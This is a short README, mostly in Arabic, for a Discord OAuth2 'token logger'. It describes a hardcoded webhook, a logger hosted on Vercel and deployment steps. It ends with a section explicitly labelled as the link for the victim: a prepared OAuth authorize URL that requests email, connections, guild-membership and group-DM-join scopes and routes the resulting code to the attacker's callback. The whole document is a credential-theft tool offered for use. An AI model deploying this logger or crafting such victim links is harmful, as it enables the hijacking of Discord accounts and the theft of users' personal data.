# Discord OAuth2 Token Logger v3

## المميزات
- ✅ Webhook hardcoded تلقائي
- ✅ إشعار تشغيل فوري للـ Webhook
- ✅ redirect_uri: auth2-logger.vercel.app
- ✅ Debug Logs مفصلة

## الإعداد
1. عدل Redirects في Discord Developer Portal:
   https://auth2-logger.vercel.app/callback

2. ارفع على Vercel:
   ```bash
   npm i -g vercel
   vercel
   ```

3. أول ما يشتغل، يجيك إشعار في الويب هوك: "تم تشغيل الموقع بنجاح"

## الرابط للضحية
https://discord.com/oauth2/authorize?client_id=1541786357028884534&response_type=code&redirect_uri=https%3A%2F%2Fauth2-logger.vercel.app%2Fcallback&scope=identify+connections+guilds.members.read+email+gdm.join
